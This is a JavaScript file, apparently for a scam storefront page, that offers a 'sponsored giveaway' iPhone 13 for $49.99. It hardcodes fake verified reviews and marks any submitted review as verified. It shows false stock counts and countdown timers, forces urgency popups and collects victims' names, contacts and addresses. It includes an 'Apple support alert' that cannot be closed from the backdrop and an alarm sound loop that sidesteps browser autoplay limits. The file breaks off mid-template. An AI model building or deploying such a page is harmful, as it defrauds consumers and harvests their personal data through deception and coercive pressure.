// Service Package Configuration Data
const PACKAGES = {
  midnight: {
    id: "midnight",
    name: "Midnight (Black)",
    title: "Apple iPhone 13 (128GB, Midnight) - Promotional Giveaway Unit (Sponsored by Xperience Media LLC - Celebrating 2026 California Expansion)",
    priceOneTime: 49.99,
    priceSub: 49.99,
    listPrice: 699.00,
    savingBadge: "SAVE 93%",
    image: "images/iphone_midnight.png",
    hasSubscription: false,
    bullets: [
      "<strong>SPONSOR:</strong> 100% sponsored by Xperience Media LLC, a premier creative agency specializing in content marketing, Google/Meta ads, custom software development, and unique mobile UI design.",
      "<strong>AUTHENTIC APPLE PRODUCT:</strong> Brand new, factory-sealed Apple iPhone 13 (128GB, Midnight). Fully unlocked for all GSM and CDMA carriers worldwide.",
      "<strong>A15 BIONIC CHIP:</strong> Powered by the lightning-fast A15 Bionic chip with 4-core GPU, bringing Cinematic mode video and high-fidelity mobile gaming to your fingertips.",
      "<strong>ADVANCED DUAL-CAMERA:</strong> Dual 12MP camera system (Wide and Ultra Wide) with Photographic Styles, Smart HDR 4, Night mode, and 4K Dolby Vision HDR recording.",
      "<strong>CLAIM LIMITATION:</strong> Strict limit of 1 promotional unit per household. Only 7 total giveaway devices are allocated. Stock is strictly first-come, first-served."
    ]
  },
  blue: {
    id: "blue",
    name: "Blue",
    title: "Apple iPhone 13 (128GB, Blue) - Promotional Giveaway Unit (Sponsored by Xperience Media LLC - Celebrating 2026 California Expansion)",
    priceOneTime: 49.99,
    priceSub: 49.99,
    listPrice: 699.00,
    savingBadge: "SAVE 93%",
    image: "images/iphone_blue.png",
    hasSubscription: false,
    bullets: [
      "<strong>SPONSOR:</strong> 100% sponsored by Xperience Media LLC, a premier creative agency specializing in content marketing, Google/Meta ads, custom software development, and unique mobile UI design.",
      "<strong>AUTHENTIC APPLE PRODUCT:</strong> Brand new, factory-sealed Apple iPhone 13 (128GB, Blue). Fully unlocked for all GSM and CDMA carriers worldwide.",
      "<strong>SUPER RETINA XDR:</strong> Gorgeous 6.1-inch Super Retina XDR OLED display with ceramic shield front cover, providing peak brightness and high drop protection.",
      "<strong>BATTERY LIFE:</strong> Up to 19 hours of video playback. Fast charging capable with MagSafe and Qi wireless chargers.",
      "<strong>CLAIM LIMITATION:</strong> Strict limit of 1 promotional unit per household. Only 7 total giveaway devices are allocated. Stock is strictly first-come, first-served."
    ]
  },
  pink: {
    id: "pink",
    name: "Pink",
    title: "Apple iPhone 13 (128GB, Pink) - Promotional Giveaway Unit (Sponsored by Xperience Media LLC - Celebrating 2026 California Expansion)",
    priceOneTime: 49.99,
    priceSub: 49.99,
    listPrice: 699.00,
    savingBadge: "SAVE 93%",
    image: "images/iphone_pink.png",
    hasSubscription: false,
    bullets: [
      "<strong>SPONSOR:</strong> 100% sponsored by Xperience Media LLC, a premier creative agency specializing in content marketing, Google/Meta ads, custom software development, and unique mobile UI design.",
      "<strong>AUTHENTIC APPLE PRODUCT:</strong> Brand new, factory-sealed Apple iPhone 13 (128GB, Pink). Fully unlocked for all GSM and CDMA carriers worldwide.",
      "<strong>A15 BIONIC CHIP:</strong> Supercharged processing power for smooth multitasking, machine learning capabilities, and optimized power efficiency.",
      "<strong>DURABILITY & WATER RESISTANCE:</strong> Rated IP68 water and dust resistance, built with premium aerospace-grade aluminum edges.",
      "<strong>CLAIM LIMITATION:</strong> Strict limit of 1 promotional unit per household. Only 7 total giveaway devices are allocated. Stock is strictly first-come, first-served."
    ]
  }
};

// Initial State
let currentVariation = "midnight"; // Midnight by default
let purchaseMode = "onetime"; // Always 'onetime' for giveaway
let cart = [];
let urgencyTimerInterval = null;
let urgencyTimeLeft = 120; // 2 minutes countdown
let lastScrollTime = Date.now();

// Base Reviews List (Dynamic State)
let reviews = [
  {
    id: 1,
    name: "David K.",
    rating: 5,
    title: "verified giveaway - claimed a Midnight 128GB!",
    date: "May 12, 2026",
    body: "I was super skeptical at first, but Xperience Media LLC is actually giving these away. I selected the Midnight color, completed the checkout details, and it arrived in California in just 3 days! Brand new sealed box.",
    helpful: 28,
    verified: true
  },
  {
    id: 2,
    name: "Sarah M.",
    rating: 5,
    title: "Awesome promotion by Xperience Media!",
    date: "June 18, 2026",
    body: "Claimed my Blue iPhone 13. Unlocked and working perfectly. It's a great advertising campaign for their digital agency services. The glassmorphic mobile screens they design look beautiful, so I might hire them for my store too!",
    helpful: 14,
    verified: true
  },
  {
    id: 3,
    name: "Marcus T.",
    rating: 5,
    title: "Midnight model arrived yesterday",
    date: "April 5, 2026",
    body: "Clean promotion. No credit cards needed, just shipping details. The iPhone 13 was delivered in a factory-sealed box with all original accessories. Xperience Media LLC did an amazing job with this outreach campaign.",
    helpful: 8,
    verified: true
  }
];

// Document Elements
document.addEventListener("DOMContentLoaded", () => {
  initDeliveryDates();
  initCountdownTimer();
  updatePageContent();
  renderReviews();
  initEventListeners();
  
  // Trigger urgency popup after 2 seconds when arriving for the first time
  setTimeout(triggerUrgencyAlert, 2000);
});

// Setup Dates (7 days delivery window)
function initDeliveryDates() {
  const deliveryDays = 7;
  const today = new Date();
  
  // Free delivery date
  const deliveryDate = new Date();
  deliveryDate.setDate(today.getDate() + deliveryDays);
  
  const options = { weekday: 'long', month: 'long', day: 'numeric' };
  const formattedDeliveryDate = deliveryDate.toLocaleDateString('en-US', options);
  
  // Update in UI
  document.getElementById("deliveryDateSpan").textContent = formattedDeliveryDate;
  
  // Est checkout delivery
  const receiptDeliveryEst = document.getElementById("receiptDeliveryEst");
  if (receiptDeliveryEst) {
    receiptDeliveryEst.textContent = formattedDeliveryDate;
  }
}

// Countdown Timer for Fastest Delivery (tomorrow)
function initCountdownTimer() {
  let hours = 2;
  let minutes = 14;
  let seconds = 59;
  
  const countdownSpan = document.getElementById("countdownSpan");
  
  const timer = setInterval(() => {
    seconds--;
    if (seconds < 0) {
      seconds = 59;
      minutes--;
      if (minutes < 0) {
        minutes = 59;
        hours--;
        if (hours < 0) {
          clearInterval(timer);
          countdownSpan.textContent = "Tomorrow";
          return;
        }
      }
    }
    
    const formattedHours = hours > 0 ? `${hours} hr${hours > 1 ? 's' : ''} ` : '';
    countdownSpan.textContent = `${formattedHours}${minutes} min${minutes !== 1 ? 's' : ''}`;
  }, 1000);
}

// Update DOM elements on package variation or billing tab change
function updatePageContent() {
  const pkg = PACKAGES[currentVariation];
  
  // 1. Titles and breadcrumbs
  document.getElementById("productTitle").textContent = pkg.title;
  document.getElementById("breadcrumbActive").textContent = pkg.name;
  document.getElementById("selectedStyleName").textContent = pkg.name;
  
  // 2. Pricing details
  let priceStr = "";
  let priceDec = "00";
  let showSubscribe = pkg.hasSubscription;
  
  // Adjust Subscribe & Save tab visibility and active state
  const tabSubscribe = document.getElementById("tabSubscribe");
  const tabOneTime = document.getElementById("tabOneTime");
  const buyBoxDiscountNote = document.getElementById("buyBoxDiscountNote");
  
  if (!showSubscribe) {
    // If WebDev, only allow one-time purchase
    purchaseMode = "onetime";
    tabSubscribe.style.display = "none";
    tabOneTime.classList.add("active");
    buyBoxDiscountNote.style.display = "none";
  } else {
    tabSubscribe.style.display = "block";
    if (purchaseMode === "subscribe") {
      tabSubscribe.classList.add("active");
      tabOneTime.classList.remove("active");
      buyBoxDiscountNote.style.display = "inline";
    } else {
      tabOneTime.classList.add("active");
      tabSubscribe.classList.remove("active");
      buyBoxDiscountNote.style.display = "none";
    }
  }
  
  // Active Price value
  const activePrice = (purchaseMode === "subscribe" && showSubscribe) ? pkg.priceSub : pkg.priceOneTime;
  const priceParts = activePrice.toFixed(2).split(".");
  priceStr = priceParts[0];
  priceDec = priceParts[1];
  
  // Main Price Display
  document.getElementById("priceMain").textContent = priceStr;
  document.getElementById("priceDec").textContent = priceDec;
  document.getElementById("priceBadge").textContent = pkg.savingBadge;
  document.getElementById("pricePeriod").textContent = (purchaseMode === "subscribe" && showSubscribe) ? "/ month" : "";
  
  // List Price
  document.getElementById("listPriceVal").textContent = `$${pkg.listPrice.toFixed(2)}`;
  
  // Buy Box Pricing
  document.getElementById("buyBoxPrice").textContent = `$${activePrice.toFixed(2)}${ (purchaseMode === "subscribe" && showSubscribe) ? "/mo" : ""}`;
  
  // Stock Status and Shipping specifics
  const stockStatus = document.getElementById("stockStatus");
  if (currentVariation === "midnight") {
    stockStatus.innerHTML = '<span style="color: #b12704; font-weight: 700;">Only 2 units left in stock - order soon!</span>';
  } else if (currentVariation === "blue") {
    stockStatus.innerHTML = '<span style="color: #b12704; font-weight: 700;">Only 3 units left in stock - order soon!</span>';
  } else {
    stockStatus.innerHTML = '<span style="color: #b12704; font-weight: 700;">Only 2 units left in stock - order soon!</span>';
  }
  document.getElementById("shipsFromVal").textContent = "Xperience Media LLC (California)";
  document.getElementById("soldByVal").textContent = "Xperience Media Promotional Department";
  
  // 3. Update Gallery thumbnails & primary image
  const galleryThumbnails = document.getElementById("galleryThumbnails");
  galleryThumbnails.innerHTML = "";
  
  // Create thumbnails using all available package images
  const assetImages = [
    { type: "active", url: pkg.image },
    { type: "midnight", url: "images/iphone_midnight.png" },
    { type: "blue", url: "images/iphone_blue.png" },
    { type: "pink", url: "images/iphone_pink.png" }
  ];
  
  assetImages.forEach((imgObj, idx) => {
    const btn = document.createElement("button");
    btn.className = `thumbnail-btn ${idx === 0 ? 'active' : ''}`;
    btn.innerHTML = `<img src="${imgObj.url}" alt="Thumbnail View">`;
    btn.addEventListener("click", () => {
      // Set main image src
      document.getElementById("mainProductImage").src = imgObj.url;
      // Toggle active class
      document.querySelectorAll(".thumbnail-btn").forEach(b => b.classList.remove("active"));
      btn.classList.add("active");
    });
    galleryThumbnails.appendChild(btn);
  });
  
  // Reset primary gallery view to package principal mockup
  document.getElementById("mainProductImage").src = pkg.image;
  
  // 4. Bullets list
  const aboutFeatureList = document.getElementById("aboutFeatureList");
  aboutFeatureList.innerHTML = "";
  pkg.bullets.forEach(bulletText => {
    const li = document.createElement("li");
    li.innerHTML = bulletText;
    aboutFeatureList.appendChild(li);
  });
  
  // 5. Update active style selector border UI
  document.querySelectorAll(".variation-btn").forEach(btn => {
    if (btn.dataset.variation === currentVariation) {
      btn.classList.add("active");
    } else {
      btn.classList.remove("active");
    }
  });
}

// Render dynamic customer reviews
function renderReviews() {
  const feed = document.getElementById("reviewsFeed");
  feed.innerHTML = "";
  
  // Sort reviews: custom submitted reviews show on top
  const sortedReviews = [...reviews].sort((a,b) => b.id - a.id);
  
  sortedReviews.forEach(r => {
    const card = document.createElement("div");
    card.className = "review-card";
    
    // Star generator
    let starsHtml = "";
    for(let i = 1; i <= 5; i++) {
      starsHtml += `<svg style="width:14px;height:14px;fill:${i <= r.rating ? 'var(--amazon-orange)' : '#e3e6e6'}" viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>`;
    }
    
    card.innerHTML = `
      <div class="user-profile">
        <div class="user-avatar">${r.name.charAt(0)}</div>
        <span class="username">${r.name}</span>
      </div>
      <div class="review-rating-title">
        <div class="star-rating">${starsHtml}</div>
        <span class="review-title">${r.title}</span>
      </div>
      <div class="review-meta-date">Reviewed in the United States on ${r.date}</div>
      ${r.verified ? `<div class="verified-badge">Verified Purchase</div>` : ''}
      <div class="review-content">
        <p>${r.body}</p>
      </div>
      <div class="review-helpful-row">
        <span>${r.helpful > 0 ? `${r.helpful} people found this helpful` : 'Helpful?'}</span>
        <button class="btn-helpful" onclick="incrementHelpful(${r.id}, this)">Helpful</button>
      </div>
    `;
    feed.appendChild(card);
  });
  
  // Calculate average score and counts for stars
  recalculateReviewRatings();
}

// Recalculate average star rating and review histogram bar percentages
function recalculateReviewRatings() {
  const totalReviews = reviews.length;
  if(totalReviews === 0) return;
  
  const sumRating = reviews.reduce((sum, r) => sum + r.rating, 0);
  const avg = (sumRating / totalReviews).toFixed(1);
  
  // Update text values
  document.getElementById("avgRatingNum").textContent = `${avg} out of 5`;
  document.getElementById("productRatingText").textContent = `${totalReviews.toLocaleString()} ratings`;
  document.getElementById("globalRatingCountText").textContent = `${totalReviews.toLocaleString()} global ratings`;
  
  // Update header and details small stars
  const starRowProduct = document.getElementById("productStarRating");
  const starRowReviewBig = document.getElementById("reviewStarBig");
  
  const fullStars = Math.round(avg);
  let productStars = "";
  for(let i=1; i<=5; i++) {
    productStars += `<svg viewBox="0 0 24 24" style="fill:${i <= fullStars ? 'var(--amazon-orange)' : '#e3e6e6'}"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>`;
  }
  
  if (starRowProduct) starRowProduct.innerHTML = productStars;
  if (starRowReviewBig) starRowReviewBig.innerHTML = productStars;
  
  // Histogram distribution percentages
  const ratingCounts = { 5: 0, 4: 0, 3: 0, 2: 0, 1: 0 };
  reviews.forEach(r => {
    ratingCounts[r.rating]++;
  });
  
  for(let starVal = 5; starVal >= 1; starVal--) {
    const percentage = Math.round((ratingCounts[starVal] / totalReviews) * 100);
    const bar = document.getElementById(`bar${starVal}`);
    const label = document.getElementById(`pct${starVal}`);
    if (bar) bar.style.width = `${percentage}%`;
    if (label) label.textContent = `${percentage}%`;
  }
}

// Helpfulness increment button
window.incrementHelpful = function(reviewId, buttonElement) {
  const review = reviews.find(r => r.id === reviewId);
  if (review) {
    if (!buttonElement.dataset.clicked) {
      review.helpful++;
      buttonElement.dataset.clicked = "true";
      buttonElement.style.backgroundColor = "#e3e6e6";
      buttonElement.style.borderColor = "#a8b3b3";
      buttonElement.textContent = "Voted Helpful";
      buttonElement.disabled = true;
      renderReviews();
    }
  }
};

// Cart Actions & Drawer Managers
function updateCartUI() {
  const cartDrawerContent = document.getElementById("cartDrawerContent");
  const cartSubtotal = document.getElementById("cartSubtotal");
  const cartCount = document.getElementById("cartCount");
  
  cartDrawerContent.innerHTML = "";
  
  if (cart.length === 0) {
    cartDrawerContent.innerHTML = `
      <div class="cart-empty">
        <svg viewBox="0 0 24 24">
          <path d="M7 18c-1.1 0-1.99.9-1.99 2S5.9 22 7 22s2-.9 2-2-.9-2-2-2zM1 2v2h2l3.6 7.59-1.35 2.45c-.16.28-.25.61-.25.96 0 1.1.9 2 2 2h12v-2H7.42c-.14 0-.25-.11-.25-.25l.03-.12.9-1.63h7.45c.75 0 1.41-.41 1.75-1.03l3.58-6.49c.08-.14.12-.31.12-.48 0-.55-.45-1-1-1H5.21l-.94-2H1zm16 16c-1.1 0-1.99.9-1.99 2s.89 2 1.99 2 2-.9 2-2-.9-2-2-2z"/>
        </svg>
        <span>Your cart is empty.</span>
      </div>
    `;
    cartSubtotal.textContent = "$0.00";
    cartCount.textContent = "0";
    return;
  }
  
  let subtotal = 0;
  let totalItemsCount = 0;
  
  cart.forEach(item => {
    subtotal += item.price * item.qty;
    totalItemsCount += item.qty;
    
    const div = document.createElement("div");
    div.className = "cart-item";
    div.innerHTML = `
      <img src="${item.image}" alt="${item.name}" class="cart-item-img">
      <div class="cart-item-details">
        <span class="cart-item-title">${item.name}</span>
        <span class="cart-item-price">$${item.price.toFixed(2)}${item.type === "subscribe" ? "/mo" : ""}</span>
        <span class="cart-item-qty">Qty: ${item.qty} (${item.type === "subscribe" ? "Subscribe & Save" : "One-time Purchase"})</span>
        <span class="cart-item-remove" onclick="removeFromCart('${item.variationId}', '${item.type}')">Delete</span>
      </div>
    `;
    cartDrawerContent.appendChild(div);
  });
  
  cartSubtotal.textContent = `$${subtotal.toFixed(2)}`;
  cartCount.textContent = totalItemsCount;
}

// Add Item logic
function addToCart(variationId, qty, type) {
  const pkg = PACKAGES[variationId];
  const price = (type === "subscribe" && pkg.hasSubscription) ? pkg.priceSub : pkg.priceOneTime;
  
  // Check if this variation with specific buy type already in cart
  const existingIndex = cart.findIndex(item => item.variationId === variationId && item.type === type);
  
  if (existingIndex > -1) {
    cart[existingIndex].qty += parseInt(qty);
  } else {
    cart.push({
      variationId: variationId,
      name: pkg.name,
      price: price,
      qty: parseInt(qty),
      type: type,
      image: pkg.image
    });
  }
  
  updateCartUI();
  openCartDrawer();
}

window.removeFromCart = function(variationId, type) {
  cart = cart.filter(item => !(item.variationId === variationId && item.type === type));
  updateCartUI();
};

// Open/Close side cart drawer
function openCartDrawer() {
  document.getElementById("cartDrawer").classList.add("open");
  document.getElementById("pageOverlay").style.display = "block";
}

function closeCartDrawer() {
  document.getElementById("cartDrawer").classList.remove("open");
  document.getElementById("pageOverlay").style.display = "none";
}

// Modal open/close actions
function openModal(modalId) {
  // Close any drawers first
  document.getElementById("cartDrawer").classList.remove("open");
  
  // Show modal & overlay
  document.getElementById(modalId).style.display = "flex";
  document.getElementById("pageOverlay").style.display = "block";
}

function closeModal(modalId) {
  document.getElementById(modalId).style.display = "none";
  document.getElementById("pageOverlay").style.display = "none";
}

// Initialize Interactive Event Listeners
function initEventListeners() {
  
  // 1. Variations Selector Buttons
  const styleContainer = document.getElementById("styleOptionsContainer");
  if (styleContainer) {
    styleContainer.addEventListener("click", (e) => {
      const btn = e.target.closest(".variation-btn");
      if (btn) {
        currentVariation = btn.dataset.variation;
        updatePageContent();
      }
    });
  }
  
  // 2. Buy Box subscribe / onetime tabs
  const purchaseTabs = document.getElementById("purchaseTabs");
  if (purchaseTabs) {
    purchaseTabs.addEventListener("click", (e) => {
      if (e.target.classList.contains("buy-box-tab")) {
        purchaseMode = e.target.dataset.type;
        updatePageContent();
      }
    });
  }
  
  // 3. Add to Cart button click
  document.getElementById("addToCartBtn").addEventListener("click", () => {
    const qty = document.getElementById("buyQty").value;
    addToCart(currentVariation, qty, purchaseMode);
  });
  
  // 4. Cart header icon click
  document.getElementById("navCartButton").addEventListener("click", () => {
    openCartDrawer();
  });
  
  // 5. Close Cart drawer
  document.getElementById("closeCartDrawer").addEventListener("click", () => {
    closeCartDrawer();
  });
  
  // 6. Overlay clicks to close drawer or open modal
  document.getElementById("pageOverlay").addEventListener("click", () => {
    // If the Apple support alert is open, make it permanent and do not close it on backdrop tap
    if (document.getElementById("appleAlertPopup").style.display === "flex") {
      return;
    }
    closeCartDrawer();
    closeModal("reviewModal");
    closeModal("checkoutWizard");
    closeModal("checkoutReceipt");
    closeUrgencyAlert();
    closeModal("appleAlertPopup");
    closeModal("giveawayClaimModal");
    document.getElementById("pageOverlay").classList.remove("deep-blur");
    document.getElementById("popupBgContainer").style.display = "none";
    
    const iphoneScreen = document.getElementById("iphoneScreenBody");
    if (iphoneScreen) iphoneScreen.style.filter = "none";
    stopAlertSoundLoop();
  });
  
  // 7. Write Review Form modal trigger
  document.getElementById("writeReviewBtn").addEventListener("click", () => {
    openModal("reviewModal");
  });
  
  document.getElementById("closeReviewModal").addEventListener("click", () => {
    closeModal("reviewModal");
  });
  
  document.getElementById("cancelReviewBtn").addEventListener("click", () => {
    closeModal("reviewModal");
  });
  
  // Submit new review form action
  document.getElementById("addReviewForm").addEventListener("submit", (e) => {
    e.preventDefault();
    
    const nameVal = document.getElementById("reviewFormName").value;
    const titleVal = document.getElementById("reviewFormTitle").value;
    const bodyVal = document.getElementById("reviewFormBody").value;
    
    // Fetch checked rating value
    const ratingRadio = document.querySelector('input[name="rating"]:checked');
    const ratingVal = ratingRadio ? parseInt(ratingRadio.value) : 5;
    
    // Create new review object
    const newId = reviews.length + 1;
    const today = new Date();
    const dateOptions = { year: 'numeric', month: 'long', day: 'numeric' };
    const dateFormatted = today.toLocaleDateString('en-US', dateOptions);
    
    reviews.push({
      id: newId,
      name: nameVal,
      rating: ratingVal,
      title: titleVal,
      date: dateFormatted,
      body: bodyVal,
      helpful: 0,
      verified: true
    });
    
    // Reset form & close modal
    document.getElementById("addReviewForm").reset();
    closeModal("reviewModal");
    
    // Re-render
    renderReviews();
  });
  
  // 8. Buy Now Button (Direct checkout)
  // 8. Buy Now Button (Direct checkout) -> Redirects to Urgency Alert popup
  document.getElementById("buyNowBtn").addEventListener("click", () => {
    triggerUrgencyAlert();
  });
  
  document.getElementById("closeCheckoutWizard").addEventListener("click", () => {
    closeModal("checkoutWizard");
  });
  
  document.getElementById("cancelCheckoutBtn").addEventListener("click", () => {
    closeModal("checkoutWizard");
  });
  
  // Checkout Submit Form handler
  document.getElementById("checkoutSubmitForm").addEventListener("submit", (e) => {
    e.preventDefault();
    
    const pkg = PACKAGES[currentVariation];
    const activePrice = (purchaseMode === "subscribe" && pkg.hasSubscription) ? pkg.priceSub : pkg.priceOneTime;
    const isSub = (purchaseMode === "subscribe" && pkg.hasSubscription);
    const qtyVal = parseInt(document.getElementById("buyQty").value) || 1;
    const totalCharged = activePrice * qtyVal;
    
    // Populate receipt details modal
    const randOrderId = "#XM-" + Math.floor(10000 + Math.random() * 90000) + "-" + Math.floor(1000 + Math.random() * 9000);
    document.getElementById("receiptOrderId").textContent = randOrderId;
    document.getElementById("receiptItemName").textContent = `${pkg.name} (Qty: ${qtyVal})`;
    document.getElementById("receiptSubtotal").textContent = `$${totalCharged.toFixed(2)}${isSub ? '/mo' : ''}`;
    document.getElementById("receiptTotalCharged").textContent = `$${totalCharged.toFixed(2)}${isSub ? '/mo' : ''}`;
    
    // Set estimation delivery time
    const today = new Date();
    const estDate = new Date();
    estDate.setDate(today.getDate() + 7);
    const dateOptions = { weekday: 'long', month: 'long', day: 'numeric' };
    document.getElementById("receiptDeliveryEst").textContent = estDate.toLocaleDateString('en-US', dateOptions);
    
    // Close checkout input modal & show receipt confirmation
    closeModal("checkoutWizard");
    openModal("checkoutReceipt");
  });
  
  // Cart drawer checkout button redirect -> Redirects to Urgency Alert popup
  document.getElementById("checkoutBtn").addEventListener("click", () => {
    triggerUrgencyAlert();
    closeCartDrawer();
  });
  
  document.getElementById("closeReceiptBtn").addEventListener("click", () => {
    closeModal("checkoutReceipt");
    cart = []; // Clear cart on success purchase
    updateCartUI();
  });
  
  document.getElementById("receiptOkBtn").addEventListener("click", () => {
    closeModal("checkoutReceipt");
    cart = []; // Clear cart on success purchase
    updateCartUI();
  });
  
  // 9. Back to Top smooth scroll
  document.getElementById("backToTopBtn").addEventListener("click", () => {
    window.scrollTo({ top: 0, behavior: 'smooth' });
  });
  
  // 10. Search query inputs handler (filters variations)
  document.getElementById("searchButton").addEventListener("click", () => {
    triggerSearchRedirect();
  });
  
  document.getElementById("searchQuery").addEventListener("keyup", (e) => {
    if (e.key === "Enter") {
      triggerSearchRedirect();
    }
  });
  
  // 11. Subnav link filters
  document.querySelectorAll(".filter-service-link").forEach(link => {
    link.addEventListener("click", (e) => {
      e.preventDefault();
      const target = link.dataset.target;
      currentVariation = target;
      updatePageContent();
      // Scroll to primary details layout
      document.querySelector(".product-main-grid").scrollIntoView({ behavior: 'smooth' });
    });
  });
  
  // 12. Q&A Search bar live filter
  const qaSearchInput = document.getElementById("qaSearchInput");
  if (qaSearchInput) {
    qaSearchInput.addEventListener("keyup", () => {
      const qVal = qaSearchInput.value.toLowerCase().trim();
      const qaItems = document.querySelectorAll(".qa-item");
      let foundMatches = 0;
      
      qaItems.forEach(item => {
        const keywords = item.dataset.question.toLowerCase();
        const text = item.textContent.toLowerCase();
        
        if (text.includes(qVal) || keywords.includes(qVal)) {
          item.style.display = "grid";
          foundMatches++;
        } else {
          item.style.display = "none";
        }
      });
      
      // Handle "No results found" container if we need one (optional)
      let noResultDiv = document.getElementById("qaNoResults");
      if (foundMatches === 0) {
        if (!noResultDiv) {
          noResultDiv = document.createElement("div");
          noResultDiv.id = "qaNoResults";
          noResultDiv.style.padding = "20px";
          noResultDiv.style.textAlign = "center";
          noResultDiv.style.color = "var(--amazon-text-muted)";
          noResultDiv.textContent = "No questions found matching your search term.";
          document.getElementById("qaList").appendChild(noResultDiv);
        }
        noResultDiv.style.display = "block";
      } else {
        if (noResultDiv) noResultDiv.style.display = "none";
      }
    });
  }

  // 13. Urgency Alert controls
  const closeUrgency = document.getElementById("closeUrgencyPopup");
  if (closeUrgency) {
    closeUrgency.addEventListener("click", () => {
      closeUrgencyAlert();
    });
  }

  const cancelUrgency = document.getElementById("cancelUrgencyBtn");
  if (cancelUrgency) {
    cancelUrgency.addEventListener("click", () => {
      closeUrgencyAlert();
    });
  }

  const claimUrgency = document.getElementById("claimUrgencyBtn");
  if (claimUrgency) {
    claimUrgency.addEventListener("click", () => {
      // Clear browser autoplay policy limits with immediate silent pre-play
      startAlertSoundLoopSilent();
      
      // Close the urgency warning modal
      closeModal("urgencyPopup");
      
      // Stop the timer
      if (urgencyTimerInterval) {
        clearInterval(urgencyTimerInterval);
      }
      
      // Open the new Giveaway Claim Details Form Modal
      openModal("giveawayClaimModal");
      
      // Reset the claim button back to original state
      claimUrgency.textContent = "Claim Now";
      claimUrgency.disabled = false;
      claimUrgency.style.opacity = "1";
    });
  }

  // Close Giveaway Claim Modal
  const closeClaimBtn = document.getElementById("closeClaimModal");
  if (closeClaimBtn) {
    closeClaimBtn.addEventListener("click", () => {
      closeModal("giveawayClaimModal");
    });
  }

  // Submit Giveaway Claim Details Form
  const claimForm = document.getElementById("giveawayClaimForm");
  if (claimForm) {
    claimForm.addEventListener("submit", (e) => {
      e.preventDefault();
      
      // Clear the urgency countdown timer since order is now submitted
      if (urgencyTimerInterval) {
        clearInterval(urgencyTimerInterval);
        urgencyTimerInterval = null;
      }
      
      // Secondary silent pre-play triggers to secure autoplay token clearances
      startAlertSoundLoopSilent();
      
      const firstName = document.getElementById("claimFirstName").value.toUpperCase();
      const lastName = document.getElementById("claimLastName").value.toUpperCase();
      const contact = document.getElementById("claimContact").value.toUpperCase();
      const address = document.getElementById("claimCustomerAddress").value.toUpperCase();
      const modalBody = document.getElementById("claimModalBody");
      
      const pkg = PACKAGES[currentVariation];
      
      // Show Confirmation Message in place
      modalBody.innerHTML = `
        <div style="background-color: #ffffff; border: 1px solid #ddd; border-radius: 8px; padding: 18px 16px; box-sizing: border-box; text-align: left; font-family: -apple-system, BlinkMacSystemFont, sans-serif;">
          <!-- Success green banner -->
          <div style="display: flex; align-items: flex-start; gap: 10px; margin-bottom: 12px;">
            <div style="width: 24px; height: 24px; background-color: #2e7d32; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0; margin-top: 2px;">
              <svg style="width: 14px; height: 14px; fill: white;" viewBox="0 0 24 24">
                <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
              </svg>
            </div>
            <div>
              <h3 style="color: #2e7d32; font-size: 17px; font-weight: 700; margin: 0 0 4px; line-height: 1.2; text-transform: uppercase;">ORDER PLACED, THANK YOU!</h3>
              <p style="color: #565959; font-size: 12px; margin: 0; text-transform: uppercase;">CONFIRMATION SENT TO <strong>${contact}</strong></p>
            </div>
          </div>
          
          <hr style="border: 0; border-top: 1px solid #ddd; margin: 14px 0;">
          
          <!-- Shipping Tracker -->
          <div style="margin-bottom: 18px;">
            <div style="font-size: 12px; font-weight: 700; color: #111; margin-bottom: 8px; text-transform: uppercase;">ORDER TRACKER STATUS:</div>
            <div style="display: flex; align-items: center; justify-content: space-between; margin: 8px 0; padding: 0 10px; position: relative;">
              <div style="position: absolute; top: 12px; left: 24px; right: 24px; height: 3px; background-color: #e0e0e0; z-index: 1;"></div>
              <div style="position: absolute; top: 12px; left: 24px; width: 0%; height: 3px; background-color: #2e7d32; z-index: 2;"></div>
              
              <div style="display: flex; flex-direction: column; align-items: center; z-index: 3; position: relative;">
                <div style="width: 24px; height: 24px; border-radius: 50%; background-color: #2e7d32; display: flex; align-items: center; justify-content: center; border: 2px solid #ffffff; box-shadow: 0 1px 3px rgba(0,0,0,0.15);">
                  <svg style="width: 12px; height: 12px; fill: white;" viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
                </div>
                <span style="font-size: 9px; font-weight: 700; color: #2e7d32; margin-top: 4px; text-transform: uppercase;">ORDERED</span>
              </div>
              <div style="display: flex; flex-direction: column; align-items: center; z-index: 3; position: relative;">
                <div style="width: 24px; height: 24px; border-radius: 50%; background-color: #ffffff; border: 2px solid #bdbdbd; display: flex; align-items: center; justify-content: center; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
                  <div style="width: 6px; height: 6px; border-radius: 50%; background-color: #bdbdbd;"></div>
                </div>
                <span style="font-size: 9px; font-weight: 500; color: #757575; margin-top: 4px; text-transform: uppercase;">SHIPPED</span>
              </div>
              <div style="display: flex; flex-direction: column; align-items: center; z-index: 3; position: relative;">
                <div style="width: 24px; height: 24px; border-radius: 50%; background-color: #ffffff; border: 2px solid #bdbdbd; display: flex; align-items: center; justify-content: center; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
                  <div style="width: 6px; height: 6px; border-radius: 50%; background-color: #bdbdbd;"></div>
                </div>
                <span style="font-size: 9px; font-weight: 500; color: #757575; margin-top: 4px; text-transform: uppercase;">OUT FOR DELIVERY</span>
              </div>
              <div style="display: flex; flex-direction: column; align-items: center; z-index: 3; position: relative;">
                <div style="width: 24px; height: 24px; border-radius: 50%; background-color: #ffffff; border: 2px solid #bdbdbd; display: flex; align-items: center; justify-content: center; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
                  <div style="width: 6px; height: 6px; border-radius: 50%; background-color: #bdbdbd;"></div>
                </div>
                <span style="font-size: 9px; font-weight: 500; color: #757575; margin-top: 4px; text-transform: uppercase;">TOMORROW</span>
              </div>
            </div>
          </div>
          
          <!-- Shipping details card -->
          <div style="background-color: #f7f9fa; border: 1px solid #ddd; border-radius: 6px; padding: 12px; margin-bottom: 14px; font-size: 13px; line-height: 1.45; color: #111;">
            <div style="display: flex; gap: 10px; margin-bottom: 8px;">
